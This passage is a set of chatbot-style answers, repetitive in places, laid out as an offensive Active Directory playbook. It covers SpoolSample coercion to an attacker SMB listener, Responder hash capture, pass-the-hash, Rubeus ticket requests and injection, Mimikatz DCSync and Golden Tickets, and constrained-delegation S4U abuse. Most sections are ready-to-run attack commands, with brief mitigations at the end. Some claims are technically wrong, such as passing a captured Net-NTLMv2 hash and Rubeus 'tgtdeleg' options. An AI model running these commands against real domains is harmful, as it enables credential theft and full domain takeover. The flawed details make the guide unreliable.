   In the attack, the **target (Domain Controller or high-privilege machine)** is told to connect to a network resource (a print server). Instead of a legitimate printer, the attacker provides a malicious **SMB server** under their control. Since the target trusts the request, it attempts to authenticate with the attacker’s SMB server.

3. **NTLM Authentication Attempt**:
   When the target machine (the Domain Controller) connects to the attacker-controlled SMB server, it attempts to authenticate using **NTLM**. This authentication mechanism sends a **Net-NTLM hash** (the encrypted challenge-response pair) to the attacker’s system.

4. **Capture the NTLM Hash**:
   The attacker’s **SMB listener** (e.g., tools like **Responder** or **Inveigh**) captures the NTLM hash during this authentication process. This hash can then be used in various attacks such as **Pass-the-Hash (PtH)** or **Pass-the-Ticket (PtT)** to gain unauthorized access to other systems in the domain.

### Practical Steps of the Attack

#### 1. **Set up an SMB Listener (Attacker’s Machine)**

The attacker runs a tool such as **Responder** or **Inveigh** on their machine to act as a fake SMB server. This tool will capture the NTLM hashes when the Domain Controller tries to authenticate.

Example using **Responder**:
```bash
python Responder.py -I eth0
```

#### 2. **Trigger the Domain Controller to Authenticate to the Malicious SMB Server**
The attacker uses **SpoolSample** to force the Domain Controller to authenticate to the malicious SMB server. **SpoolSample** exploits the Print Spooler vulnerability by sending an RPC request to the Domain Controller to connect to a printer hosted on the attacker’s machine.

Example SpoolSample command:
```bash
SpoolSample.exe <target_dc> <attacker_ip>
```

- `<target_dc>`: The IP address or hostname of the Domain Controller.
- `<attacker_ip>`: The IP address of the attacker’s SMB server.

This command tells the Domain Controller to reach out to the attacker's system, expecting it to be a print server.

#### 3. **Capture the NTLM Hash**:
Once the **Domain Controller** (or another target) connects to the attacker’s SMB server, the SMB listener (Responder/Inveigh) captures the NTLM hash. The attacker can now use this hash for further attacks.

Example output from Responder:
```bash
[+] NTLMv2-SSP Hash     : DOMAIN\User::DomainController:lmhash:ntlmhash:challenge
```

#### 4. **Using the Captured NTLM Hash**:
The attacker can now leverage this NTLM hash to perform **Pass-the-Hash (PtH)** or **Pass-the-Ticket (PtT)** attacks, giving them access to other systems in the domain.

- **Pass-the-Hash**: The attacker can use tools like **Mimikatz** or **Impacket’s psexec** to authenticate to systems using the captured hash.
  
Example with **Impacket psexec**:
```bash
psexec.py DOMAIN/User@TargetDC -hashes lmhash:ntlmhash
```

---

### Combining SpoolSample with Other Attacks

- **With Rubeus**: Once the attacker has NTLM credentials, they can use **Rubeus** to request Kerberos tickets (TGTs) or perform pass-the-ticket attacks.
- **With DCSync**: If the captured NTLM hash is from a domain admin or a Domain Controller machine account, the attacker can escalate privileges and perform a **DCSync attack** to extract the **krbtgt hash** for generating a **Golden Ticket**.

### Conclusion

**SpoolSample** exploits the **Windows Print Spooler** service by forcing a Domain Controller or privileged machine to authenticate to an attacker-controlled SMB server, where the NTLM hash is captured. This attack is a useful precursor to **Pass-the-Hash**, **Kerberos ticket attacks**, or **DCSync**-based privilege escalation, ultimately leading to **domain-wide compromise** if leveraged effectively.

### Mitigation

- **Disable the Print Spooler service** on **Domain Controllers** and high-value targets.
- Apply **patches** for vulnerabilities like CVE-2020-1048 and CVE-2020-1337.
- Implement **SMB signing** and enforce **NTLMv2** authentication to reduce the effectiveness of hash-based attacks.

### How Rubeus Can Be Used After SpoolSample Attack

Here’s a potential workflow that involves both **SpoolSample** and **Rubeus**:

#### 1. **SpoolSample Captures NTLM Hashes**:
   - As described earlier, you can use **SpoolSample** to force a machine (such as a domain controller) to authenticate to your attacker-controlled machine over SMB. This results in capturing **NTLM hashes** via tools like **Responder**, **Inveigh**, or **Impacket’s ntlmrelayx**.

#### 2. **Relay or Crack NTLM Hashes**:
   - **Relay the NTLM hash**: You can relay the captured NTLM hash using **ntlmrelayx** to authenticate as the victim to another machine.
   - **Crack the NTLM hash**: Use tools like **hashcat** to perform an offline brute-force or dictionary attack on the NTLM hash to obtain the plaintext password.

#### 3. **Use NTLM Credentials to Request Kerberos TGT**:
   - If you manage to crack the NTLM hash or have valid credentials, you can then use **Rubeus** to request a **Kerberos TGT (Ticket Granting Ticket)** using the stolen credentials. This is useful for **Kerberos-based attacks** like **pass-the-ticket** or **Kerberoasting**.

   Here’s how you can use **Rubeus** to request a TGT with the cracked or captured password:

   ```powershell
   Rubeus.exe asktgt /user:<username> /rc4:<NTLM hash> /domain:<domain> /dc:<domain controller> /nowrap
   ```

   - **`/rc4:<NTLM hash>`**: Use the NTLM hash as the RC4 encryption key to request a TGT.
   - **`/domain:<domain>`**: Specify the domain name of the target.
   - **`/dc:<domain controller>`**: Specify the domain controller you are requesting the TGT from.

#### 4. **Perform Pass-the-Ticket Attack**:
   - Once you have obtained the **TGT** with **Rubeus**, you can use that TGT for a **Pass-the-Ticket** attack to impersonate the victim user and access other network resources with their privileges.

   Example of injecting a TGT with Rubeus:

   ```powershell
   Rubeus.exe ptt /ticket:<base64_ticket>
   ```

   This injects the stolen or generated TGT into the current session, allowing you to authenticate to services as the victim.

### Additional Considerations:
- **Kerberoasting**: If you successfully request a TGT and gain access to a domain user, you can use **Rubeus** for **Kerberoasting**. This involves requesting service tickets for SPNs, extracting the encrypted part of the ticket, and then cracking it offline.

   Example:

   ```powershell
   Rubeus.exe kerberoast
   ```

   This will list all service tickets for accounts with SPNs, which you can then attempt to crack.

- **Overpass-the-Hash**: If you obtain a valid NTLM hash, **Rubeus** can also be used to perform an **Overpass-the-Hash (Pass-the-Key)** attack. This is similar to Pass-the-Ticket, but instead of injecting a TGT, you request a TGT using the **NTLM hash** directly without needing the plaintext password.

   Example:

   ```powershell
   Rubeus.exe tgtdeleg /user:<username> /rc4:<NTLM hash> /domain:<domain> /sid:<domain SID>
   ```

   This allows you to authenticate using the NTLM hash instead of a password and request Kerberos tickets.

### Combining SpoolSample and Rubeus:
1. **Trigger the SpoolSample attack**: Force the target machine to authenticate to your SMB share and capture NTLM hashes.
2. **Relay or crack the NTLM hash**: Relay the captured hash for remote access or crack it for plaintext credentials.
3. **Leverage Rubeus**: Use Rubeus to request a TGT, perform Pass-the-Ticket, Overpass-the-Hash, or Kerberoasting attacks using the obtained credentials or NTLM hash.

### Mitigation:
- **Disable the Print Spooler service** on high-privilege machines (like domain controllers) unless it is absolutely necessary.
- **Enforce SMB signing** and disable NTLM to prevent NTLM relay and hash capture attacks.
- Apply all relevant security patches, especially those related to the Print Spooler vulnerabilities like **PrintNightmare**.

By combining **SpoolSample** to capture NTLM hashes and **Rubeus** for post-exploitation Kerberos attacks, attackers can escalate privileges or perform lateral movement within a network.

To perform a **DCSync** attack using **Rubeus**, the **Print Spooler** abuse (like the SpoolSample attack), and **Mimikatz**, you can follow these steps. The DCSync attack is a technique where an attacker impersonates a Domain Controller (DC) and requests user credential data, including password hashes, from another DC. The goal is to extract sensitive information, such as **NTLM** and **Kerberos** hashes, from the **Active Directory (AD)** database without needing direct access to the Domain Controller itself.

### Workflow Overview

The attack consists of three major stages:

1. **Abusing the Print Spooler Service** to get a privileged user or Domain Controller to authenticate to the attacker’s machine and capture NTLM credentials.
2. **Using Rubeus** to request Kerberos **TGT** or **service tickets** based on captured credentials.
3. **Performing DCSync with Mimikatz** using the appropriate privileges or credentials obtained from Rubeus.

### Steps to Perform the Attack:

#### 1. **Abuse Print Spooler to Capture NTLM Hashes**

You will begin by abusing the **Print Spooler** service to force a Domain Controller or privileged user (such as a domain admin) to authenticate to an attacker-controlled SMB share, leaking their **NTLM hashes**.

- Set up an SMB listener on the attacker's machine to capture NTLM hashes using **Responder** or **Inveigh**.

   Example with **Responder**:

   ```bash
   python Responder.py -I eth0
   ```

- Use a tool like **SpoolSample** or **MS-RPRN** to force the target (in this case, a Domain Controller or high-privileged user) to authenticate to your attacker-controlled SMB server.

   Example with **SpoolSample**:

   ```bash
   SpoolSample.exe <target_dc> <attacker_ip>
   ```

   This forces the target DC or machine with Print Spooler service enabled to authenticate to your SMB listener.

#### 2. **Crack or Relay NTLM Hashes**

Once the NTLM hash is captured:

- **Relay the NTLM hash** using **ntlmrelayx** to authenticate as the privileged user (such as a domain admin) to other machines in the domain.
- Alternatively, **crack the NTLM hash** using **hashcat** to recover the plaintext password.

#### 3. **Use Rubeus to Get a TGT or Service Ticket**

Once you have the NTLM hash or plaintext password of a privileged account, you can use **Rubeus** to request a **Kerberos TGT** for that account.

- If you have the **NTLM hash**, use Rubeus to request a TGT:

   ```powershell
   Rubeus.exe asktgt /user:<username> /rc4:<NTLM_hash> /domain:<domain> /dc:<dc_ip> /nowrap
   ```

   If you have the **password**:

   ```powershell
   Rubeus.exe asktgt /user:<username> /password:<password> /domain:<domain> /dc:<dc_ip>
   ```

- Inject the obtained **TGT** or **Kerberos service ticket** into your session:

   ```powershell
   Rubeus.exe ptt /ticket:<base64_ticket>
   ```

   This will allow you to impersonate the domain admin or privileged account to access resources within the domain.

#### 4. **Perform DCSync Attack with Mimikatz**

Once you have the necessary domain admin or privileged account credentials, you can use **Mimikatz** to perform a **DCSync** attack. The DCSync attack uses replication privileges to request password hashes from the Domain Controller.

- Launch **Mimikatz** and perform the DCSync:

   ```powershell
   mimikatz # privilege::debug
   mimikatz # lsadump::dcsync /domain:<domain> /user:<username>
   ```

   - `user:<username>` can be `krbtgt` if you want to dump the **Kerberos Ticket Granting Ticket (krbtgt)** account hash, which would allow you to forge **Golden Tickets**.
   - This command will dump password hashes, including **NTLM** and **Kerberos** hashes, for the specified user account.

#### 5. **Use Extracted Hashes for Further Attacks**

With the dumped **NTLM** or **Kerberos** hashes, you can:
- Perform a **Pass-the-Hash** attack using the NTLM hash to authenticate as the dumped user to other systems in the network.
- Forge a **Golden Ticket** with Mimikatz using the **krbtgt** hash, allowing you to impersonate any user in the domain and access any resource indefinitely.

### Example Workflow Summary:

1. **SpoolSample** (or similar tool) to trigger authentication from a Domain Controller or high-privileged user.
2. Capture **NTLM** credentials using **Responder** or similar.
3. **Use Rubeus** to request Kerberos tickets with the captured NTLM hash or cracked password.
4. Perform **DCSync** with **Mimikatz** to dump password hashes from the Domain Controller.

### Alternate Step-by-Step Workflow

#### 1. **Use SpoolSample to Trigger NTLM Authentication from a Domain Controller or Domain Admin**
The **SpoolSample** tool can be used to force a machine (such as a Domain Controller or another system with elevated privileges) to authenticate to an attacker-controlled system. This will help you capture **NTLM** hashes, which can be used to request Kerberos tickets later.

- **Set up an SMB listener** (using **Responder** or **Inveigh**) to capture NTLM hashes from a Domain Controller or high-privileged user:

   Example with **Responder**:
   ```bash
   python Responder.py -I eth0
   ```

- Use **SpoolSample** to force the target Domain Controller (or admin machine) to authenticate to your SMB listener:

   ```bash
   SpoolSample.exe <target_dc> <attacker_ip>
   ```

   - `<target_dc>`: IP or hostname of the Domain Controller or system you're targeting.
   - `<attacker_ip>`: IP address of your attacking machine where the SMB listener is running.

   **Result**: You should capture the **NTLM hash** of the privileged user (e.g., Domain Controller’s machine account or a domain admin’s account).

#### 2. **Use Rubeus to Monitor for TGT Tickets**
Now that you’ve potentially compromised a system where domain admins or high-privilege users may log in, you can use **Rubeus** to monitor for **Kerberos TGT tickets** passively.

- Run **Rubeus** in monitor mode on the compromised system to listen for new Kerberos tickets.

   Example command:
   ```powershell
   Rubeus.exe monitor /interval:5 /nowrap /filteruser:<target machine>
   ```

   - This command tells Rubeus to check for new tickets every 5 seconds. The `nowrap` option prevents output wrapping for easier reading.

   **Result**: Rubeus will passively monitor for Kerberos tickets that are created when users authenticate or log in to the system.

#### 3. **Use Rubeus to Dump and Extract the TGT**
Once **Rubeus** has captured a **TGT**, you can extract the ticket and inject it into your session.

- **Dump the captured TGT tickets**:

   ```powershell
   Rubeus.exe dump /nowrap
   ```

   - This will display the Kerberos tickets that were captured by Rubeus, including **TGTs** (Ticket Granting Tickets).
   - Look for the **TGT** of a high-privileged user, such as a **domain admin** or a **Domain Controller** machine account.

- **Inject the TGT ticket** into your session using the Pass-the-Ticket technique:

   ```powershell
   Rubeus.exe ptt /ticket:<base64_TGT_ticket>
   ```

   **Result**: You now impersonate the user whose TGT you captured and injected. If it’s a domain admin or a machine account, you can proceed to use that ticket for further privilege escalation.

#### 4. **Perform a DCSync Attack with Mimikatz**
Now that you have impersonated a privileged user (e.g., domain admin), you can perform a **DCSync** attack to extract password hashes from the Domain Controller.

- **Run Mimikatz** and perform the **DCSync** attack:

   ```powershell
   mimikatz # privilege::debug
   mimikatz # lsadump::dcsync /user:krbtgt /domain:<domain> /dc:<dc_ip>
   ```

   - `/user:krbtgt`: Dump the credentials for the **krbtgt** account, which is used to generate and validate Kerberos tickets.
   - `/domain:<domain>`: The domain name of the target Active Directory.
   - `/dc:<dc_ip>`: The IP address of the Domain Controller.

   **Result**: You will retrieve the **NTLM** and **Kerberos hash** for the `krbtgt` account. This is essential for creating a **Golden Ticket**.

#### 5. **Generate a Golden Ticket with Mimikatz**
With the **krbtgt hash** from the DCSync attack, you can now generate a **Golden Ticket**. This will allow you to impersonate any user within the domain indefinitely.

- Use **Mimikatz** to create the Golden Ticket:

   ```powershell
   mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /id:500 /ptt
   ```

   - `/user:<username>`: Specify the username you want to impersonate (can be any user, such as **Administrator**).
   - `/domain:<domain>`: The target domain.
   - `/sid:<domain_sid>`: The Security Identifier (SID) of the domain (retrieved via DCSync or using the `whoami /all` command).
   - `/krbtgt:<krbtgt_hash>`: The NTLM hash of the **krbtgt** account obtained from the DCSync attack.
   - `/id:500`: The **RID** for the user account you want to impersonate (500 is the RID for the domain’s **Administrator** account).
   - `/ptt`: Automatically injects the Golden Ticket into the current session.

   **Result**: You now have a **Golden Ticket** that allows you to impersonate any user within the domain, effectively giving you **persistent domain admin access**.

---

### Full Attack Chain Summary:

1. **SpoolSample** triggers authentication from a privileged account (like a domain admin or DC) and captures the NTLM hash.
2. Use the NTLM hash to request and monitor **Kerberos TGT** using **Rubeus**.
3. Extract the captured TGT, and inject it using **Rubeus** (Pass-the-Ticket).
4. Perform a **DCSync** attack using **Mimikatz** to dump the **krbtgt** hash.
5. Use the **krbtgt hash** to generate a **Golden Ticket** with **Mimikatz**, giving you indefinite domain admin privileges.

### Mitigations:
- **Disable the Print Spooler service** on critical systems like Domain Controllers to prevent **SpoolSample** attacks.
- Restrict **replication rights** to only a few trusted accounts to mitigate **DCSync** attacks.
- Regularly rotate the **krbtgt** account password to invalidate previously issued **Golden Tickets**.


### **Constrained Delegation Overview**

**Constrained delegation** is a feature in Windows Active Directory that allows a service (e.g., a web server) to impersonate users and access specific services on their behalf. It is more restrictive than **unconstrained delegation**, where a service can impersonate users for any service. Constrained delegation limits which services the account can access using the user’s credentials.

This is typically used in environments where a service needs to access resources (e.g., SQL database) on behalf of a user without re-authenticating them.

### **How Constrained Delegation Works**

1. **Service Account Setup**: An account (e.g., a web server account) is granted constrained delegation rights, which specify that it can delegate a user's credentials but only to a specific service (e.g., SQL, LDAP).
   
2. **Service Ticket Usage**: When a user authenticates to the service, the service can request a service ticket for another service on behalf of the user (e.g., from the web server to a SQL server). The key difference with constrained delegation is that the delegation is limited to certain services.

3. **Service Principal Names (SPNs)**: In constrained delegation, the service account is associated with specific SPNs (e.g., MSSQLSvc for SQL Server), and only those SPNs can be used in the delegation process.

---

### **How to Find Constrained Delegation**

Constrained delegation settings can be discovered by querying Active Directory for accounts with delegation privileges. You can use the following tools and commands to find accounts with constrained delegation:

#### 1. **PowerView** (part of PowerSploit)

**PowerView** is a powerful PowerShell tool to query Active Directory for delegation settings.

- **Check for Constrained Delegation Accounts**:
   ```powershell
   Get-DomainUser -TrustedToAuth
   ```

   This will return a list of users that are trusted for delegation.

- **Check for Computer Accounts with Constrained Delegation**:
   ```powershell
   Get-DomainComputer -TrustedToAuth
   ```

- **Query Specific SPNs for Delegation**:
   You can search for accounts or services that are allowed to delegate to specific SPNs, like SQL or LDAP.

   ```powershell
   Get-DomainUser -TrustedToAuth | Get-DomainSPN
   ```

#### 2. **BloodHound**

**BloodHound** is a powerful tool that maps out Active Directory relationships and privileges. It can help visualize which accounts have delegation rights.

- **Run the BloodHound ingestor (SharpHound)** on a system:
   ```bash
   SharpHound.exe -c All
   ```

- Once ingested, look for accounts or computers with constrained delegation and see what services they can delegate to.

In BloodHound, you can query nodes with constrained delegation under the **"Outbound Delegations"** section.

#### 3. **LDAP Queries** via PowerShell

You can perform **LDAP queries** directly against Active Directory to check for constrained delegation settings.

```powershell
$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.Filter = "(&(objectCategory=user)(msDS-AllowedToDelegateTo=*))"
$Results = $Searcher.FindAll()
$Results
```

This will return any accounts that are configured with constrained delegation.

---

### **Exploiting Constrained Delegation**

Constrained delegation can be exploited when an attacker gains control of a service account that has constrained delegation privileges. The attacker can use the service account to impersonate users (even domain admins) and request service tickets to access resources, potentially leading to privilege escalation.

#### Attack Scenario

If a service account is configured with constrained delegation, it can impersonate any user and access certain services. For example, if a web server account can impersonate users to a SQL server, an attacker controlling that account could impersonate a **domain admin** and access the SQL server or other allowed services.

#### Exploitation Steps

1. **Compromise the Service Account**: The first step is to gain control of a service account that has constrained delegation rights. This can be done via phishing, weak passwords, or other lateral movement techniques.

2. **Use Tools to Perform Ticket Request**: Once you have control of the service account, you can use tools like **Rubeus** or **Impacket** to request a **service ticket** on behalf of a user (e.g., a domain admin) and then use that ticket to access other services.

---

### **Tools and Commands for Exploiting Constrained Delegation**

#### 1. **Rubeus**

**Rubeus** is a tool for manipulating Kerberos tickets, including requesting service tickets and performing delegation attacks.

- **Request a Ticket Granting Service (TGS) Ticket on Behalf of a User**:

   After compromising the service account with constrained delegation, use **Rubeus** to request a service ticket for a high-privilege user (e.g., domain admin).

   ```powershell
   Rubeus.exe s4u /user:<service_account> /rc4:<service_account_hash> /impersonateuser:<target_user> /msdsspn:<SPN_of_service> /ptt
   ```

   - `/user`: The name of the service account you’ve compromised.
   - `/rc4`: The NTLM hash of the service account’s password.
   - `/impersonateuser`: The user you want to impersonate (e.g., **Administrator**).
   - `/msdsspn`: The SPN of the service (e.g., **MSSQLSvc/sqlserver.domain.com:1433** for SQL Server).

   This command generates a service ticket on behalf of the **target user** and injects it into the session (`/ptt` flag).

   **Result**: You are now impersonating the **target user** (e.g., domain admin) to access the specified service (e.g., SQL).

#### 2. **Impacket’s `getST.py`**

The **Impacket** suite provides a tool called `getST.py` that can also be used to exploit constrained delegation.

- **Request a Service Ticket**:

   If you’ve compromised a service account, you can request a service ticket on behalf of a target user (e.g., domain admin) using Impacket.

   ```bash
   getST.py -spn <SPN_of_service> <domain>/<service_account>:<password> -impersonate <target_user>
   ```

   - `-spn`: The SPN of the service (e.g., **MSSQLSvc/sqlserver.domain.com:1433**).
   - `-impersonate`: The user you want to impersonate (e.g., **Administrator**).

   This will generate a **TGS** for the specified service on behalf of the target user.

#### 3. **Mimikatz**

If you have control over the service account, you can use **Mimikatz** to perform the same kind of constrained delegation attack.

- **Perform a Service Ticket Request**:

   ```powershell
   mimikatz # kerberos::golden /user:<target_user> /domain:<domain> /sid:<domain_sid> /target:<SPN> /rc4:<service_account_hash> /ptt
   ```

   - `/user`: The user you want to impersonate.
   - `/target`: The SPN of the service you want to access.
   - `/rc4`: The NTLM hash of the compromised service account.

   This will create and inject a service ticket for the specified user.

---

### **Mitigations for Constrained Delegation Exploitation**

1. **Limit Accounts with Delegation Rights**: Restrict delegation to only necessary accounts and services, and review the accounts regularly to ensure they don’t have unnecessary delegation permissions.

2. **Disable Delegation for High-Privilege Accounts**: Ensure that privileged accounts, like domain admins, are **not allowed to be delegated** by setting the `Account is sensitive and cannot be delegated` flag.

3. **Monitor Delegation Usage**: Use logging and monitoring tools to track the usage of delegation in your network. Look for suspicious patterns, such as service accounts impersonating high-privilege users.

4. **Enforce Strong Authentication**: Consider using **Kerberos constrained delegation with resource-based delegation** (introduced in Windows Server 2012), which gives resource owners control over who can delegate to them.
### **Constrained Delegation, S4U2Self, S4U2Proxy, and Privilege Escalation using Rubeus**

**Constrained delegation** allows a service to act on behalf of a user, but only to a limited set of services specified in the configuration. Unlike **unconstrained delegation**, which allows impersonation to any service, constrained delegation is much more restrictive. Attackers can, however, exploit constrained delegation using Kerberos extensions like **S4U2Self** and **S4U2Proxy** combined with tools like **Rubeus** to escalate privileges.

---

### **Key Concepts in Constrained Delegation**

1. **S4U2Self (Service for User to Self)**:
   - Allows a service to request a **service ticket** for a user without needing the user's **Ticket Granting Ticket (TGT)**.
   - The service can only request service tickets for itself (i.e., the service on the system running the request).

2. **S4U2Proxy (Service for User to Proxy)**:
   - After acquiring a service ticket via **S4U2Self**, the service can use **S4U2Proxy** to request service tickets for other services on behalf of the user.
   - This process allows the service to act on behalf of the user to access another service within the domain.

---

### **How to Exploit Constrained Delegation Using S4U2Self and S4U2Proxy**

**Rubeus** is a Kerberos exploitation tool that can be used to abuse these features to elevate privileges in an Active Directory (AD) environment.

#### **Scenario: Elevating Privileges Using S4U2Self and S4U2Proxy**

An attacker with control over a computer account or service that has constrained delegation enabled can exploit it by:
- Using **S4U2Self** to impersonate any user in the domain, including domain admins.
- Using **S4U2Proxy** to request service tickets to other services on behalf of the impersonated user, allowing the attacker to escalate privileges.

### **Step-by-Step Process Using Rubeus**

#### **1. Identify Constrained Delegation Accounts**

First, you need to identify which accounts or services in the domain are configured for **constrained delegation**.

- **PowerView** can help you find these accounts:

```powershell
# Search for accounts with constrained delegation enabled
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

These commands will list users or computers that are trusted for constrained delegation. Take note of these accounts, as they are potential targets.

#### **2. Using S4U2Self to Impersonate a User**

Once you identify a service with constrained delegation, you can use **Rubeus** to request a service ticket for a user (e.g., a domain admin) using **S4U2Self**.

- First, acquire the **TGT** for the service account you control (which has constrained delegation enabled). If you already have control of the account, you can use **Rubeus** or **Mimikatz** to dump the TGT:

```powershell
# Dump the TGT of the controlled account (if available)
Rubeus.exe dump
```

- Next, use **S4U2Self** to impersonate another user (e.g., a domain admin):

```powershell
# Perform S4U2Self to impersonate a domain admin
Rubeus.exe s4u /user:ControlledAccount /impersonateuser:DomainAdmin /rc4:<NTLM Hash of Controlled Account> /domain:example.com /sid:S-1-5-21-<DomainSID>
```

In this step:
- `/user`: The account that has constrained delegation enabled (the service account you control).
- `/impersonateuser`: The user you want to impersonate (e.g., a domain admin).
- `/rc4`: The NTLM hash of the controlled account.

This will request a service ticket for the **domain admin** using **S4U2Self**.

#### **3. Using S4U2Proxy to Request Service Tickets for Other Services**

Once you have a service ticket for the impersonated user, you can use **S4U2Proxy** to request tickets for other services (e.g., **CIFS** for file shares, **HTTP** for web services, etc.).

```powershell
# Use S4U2Proxy to request a ticket to access another service (e.g., CIFS)
Rubeus.exe s4u /user:ControlledAccount /impersonateuser:DomainAdmin /rc4:<NTLM Hash of Controlled Account> /domain:example.com /sid:S-1-5-21-<DomainSID> /targetservice:cifs /targetserver:TargetServer
```

In this step:
- `/targetservice`: The service you want to access on behalf of the user (e.g., **cifs** for file shares).
- `/targetserver`: The server hosting the service you want to access.

This command requests a ticket for the **CIFS** service on the specified server using the **domain admin** credentials.

#### **4. Using the Ticket to Access Services**

Now that you have the ticket, you can use it to access the specified service (e.g., a file share) as the impersonated user (e.g., the domain admin).

For example, to apply the ticket and access a file share:

```powershell
# Apply the ticket
Rubeus.exe ptt /ticket:<TicketFile>

# Access the file share (CIFS) as the impersonated domain admin
net use \\TargetServer\ShareName
```

You now have access to the file share or service as the impersonated domain admin.

---

### **Exploitation Summary**

1. **Identify accounts** with constrained delegation using **PowerView**.
2. Use **Rubeus** to exploit **S4U2Self** and impersonate a higher-privileged user (e.g., a domain admin).
3. Use **S4U2Proxy** to request tickets for other services (e.g., CIFS, HTTP) as the impersonated user.
4. Apply the tickets and access services as the higher-privileged user, thereby escalating your privileges.

---

### **Exploitation Example Flow**

| Step | Action                                                                                  | Tool      |
|------|------------------------------------------------------------------------------------------|-----------|
| 1    | Identify constrained delegation accounts (e.g., services with delegation enabled).       | PowerView |
| 2    | Dump the **TGT** of the controlled account (with constrained delegation).                | Rubeus    |
| 3    | Use **S4U2Self** to impersonate a domain admin (or other privileged user).               | Rubeus    |
| 4    | Use **S4U2Proxy** to request tickets to access other services as the impersonated user.  | Rubeus    |
| 5    | Apply the ticket and access the target service (e.g., file shares, HTTP).                | Rubeus    |

---

### **Mitigations**

1. **Limit Constrained Delegation**: Only enable constrained delegation where absolutely necessary, and limit the services it can access.
2. **Use Resource-Based Constrained Delegation**: This is more secure and limits the impact of delegation.
3. **Monitor for Suspicious Activity**: Keep track of **S4U** requests and unusual Kerberos activity using monitoring tools.

By abusing **S4U2Self** and **S4U2Proxy**, attackers can impersonate high-privileged users and escalate privileges within an AD environment if constrained delegation is improperly configured. Properly securing delegation settings and monitoring for potential abuse is crucial in defending against these types of attacks.

You're absolutely right! In addition to using **S4U2Self** and **S4U2Proxy** for constrained delegation attacks, the **`msDS-AllowedToDelegateTo`** property plays a critical role in defining which services a given account can delegate to. I'll also show how **Rubeus** can be used to generate a TGT using an **NTLM hash**, which is an essential step in this type of attack.

Let's go through the process in more detail, including the **`msDS-AllowedToDelegateTo`** property and generating a TGT using **Rubeus** with an NTLM hash.

---

### **What is `msDS-AllowedToDelegateTo`?**

The **`msDS-AllowedToDelegateTo`** attribute controls constrained delegation in Active Directory. This property lists which specific services (like CIFS, HTTP, LDAP, etc.) a user or computer account can delegate to on behalf of another user. It limits the delegation to only certain services and is a more secure alternative to **unconstrained delegation**.

When constrained delegation is configured, an attacker can only request service tickets (via **S4U2Proxy**) for the services listed in the **`msDS-AllowedToDelegateTo`** attribute.

### **Explaining `S4U2Self` and `S4U2Proxy` with `msDS-AllowedToDelegateTo`**

To exploit constrained delegation:

1. **`S4U2Self`** allows the attacker to impersonate a user to a service that the attacker controls (e.g., the service account's machine).
2. **`S4U2Proxy`** allows the attacker to take the impersonated user's service ticket and use it to request service tickets for other services listed in the **`msDS-AllowedToDelegateTo`** property.

### **Generating a TGT Using Rubeus with an NTLM Hash**

Before proceeding with **S4U2Self** and **S4U2Proxy**, you’ll need to generate a **TGT** for the service account with constrained delegation enabled. Rubeus can generate this TGT using the service account's **NTLM hash**. Once you have this TGT, you can impersonate any user that authenticates to the service.

#### **Step 1: Generating a TGT Using the Service Account’s NTLM Hash**

If you already have the NTLM hash of the service account, use Rubeus to generate a TGT:

```powershell
Rubeus.exe tgtdeleg /user:<ServiceAccount> /rc4:<NTLM Hash of ServiceAccount> /domain:<DomainName> /dc:<DomainController> /nowrap
```

**Explanation**:
- `/user`: The name of the service account that has constrained delegation enabled.
- `/rc4`: The **NTLM hash** of the service account. If you have the **RC4** hash of the account, use it here.
- `/domain`: The domain of the service account.
- `/dc`: The domain controller to contact for the TGT.
- `/nowrap`: This option removes any line breaks from the ticket output, useful when saving the TGT to a file.

This command requests a TGT for the service account by providing its **NTLM hash**. The output will be a **TGT**, which you will later use to impersonate users.

#### **Step 2: Using `S4U2Self` to Impersonate a User**

Once you have a **TGT** for the service account, the next step is to impersonate a higher-privileged user (e.g., a **Domain Admin**) using **S4U2Self**.

```powershell
Rubeus.exe s4u /user:<ServiceAccount> /impersonateuser:<DomainAdmin> /rc4:<NTLM Hash of ServiceAccount> /domain:<DomainName> /sid:<DomainSID>
```

- `/user`: The service account you control (the same account for which you obtained the TGT).
- `/impersonateuser`: The user you want to impersonate (e.g., **Domain Admin**).
- `/rc4`: The **NTLM hash** of the service account.
- `/sid`: The **SID** of the domain.

This command will generate a service ticket for the **Domain Admin** by using the service account's delegation rights (via **S4U2Self**).

#### **Step 3: Using `S4U2Proxy` to Request a Service Ticket for Another Service**

After generating a service ticket for the user (e.g., **Domain Admin**), you can use **S4U2Proxy** to request tickets to other services specified in the **`msDS-AllowedToDelegateTo`** property of the service account.

```powershell
Rubeus.exe s4u /user:<ServiceAccount> /impersonateuser:<DomainAdmin> /rc4:<NTLM Hash of ServiceAccount> /domain:<DomainName> /sid:<DomainSID> /targetservice:<Service> /targetserver:<TargetServer>
```

- `/targetservice`: The service you want to access (e.g., **cifs** for file shares, **HTTP** for web servers, etc.).
- `/targetserver`: The server hosting the service you want to access.

This command requests a service ticket for the **CIFS** or **HTTP** service on the target server using the **Domain Admin's** impersonated ticket.

#### **Step 4: Applying the Ticket and Accessing the Service**

Once you have the service ticket, you can use **Rubeus** to apply the ticket and access the service (e.g., a file share):

```powershell
Rubeus.exe ptt /ticket:<TicketFile>
```

This applies the service ticket. After applying the ticket, you can access the service, for example, mounting a file share as the impersonated user:

```powershell
net use \\TargetServer\ShareName
```

---

### **Summary: Combining `msDS-AllowedToDelegateTo` with S4U2Self/S4U2Proxy and Rubeus**

1. **Identify the service accounts** with constrained delegation using **PowerView**:
   - Look for accounts with the **`msDS-AllowedToDelegateTo`** property that lists services the account can delegate to.
   
   ```powershell
   Get-DomainUser -TrustedToAuth
   Get-DomainComputer -TrustedToAuth
   ```

2. **Generate a TGT** for the service account using **Rubeus** and the service account's **NTLM hash**.

   ```powershell
   Rubeus.exe tgtdeleg /user:<ServiceAccount> /rc4:<NTLM Hash> /domain:<DomainName> /dc:<DomainController> /nowrap
   ```

3. Use **S4U2Self** to impersonate a user (e.g., **Domain Admin**) using the service account's constrained delegation rights.

   ```powershell
   Rubeus.exe s4u /user:<ServiceAccount> /impersonateuser:<DomainAdmin> /rc4:<NTLM Hash> /domain:<DomainName> /sid:<DomainSID>
   ```

4. Use **S4U2Proxy** to request service tickets for services listed in the **`msDS-AllowedToDelegateTo`** property.

   ```powershell
   Rubeus.exe s4u /user:<ServiceAccount> /impersonateuser:<DomainAdmin> /rc4:<NTLM Hash> /domain:<DomainName> /sid:<DomainSID> /targetservice:cifs /targetserver:TargetServer
   ```

5. **Apply the ticket** and access the service as the impersonated user.

   ```powershell
   Rubeus.exe ptt /ticket:<TicketFile>
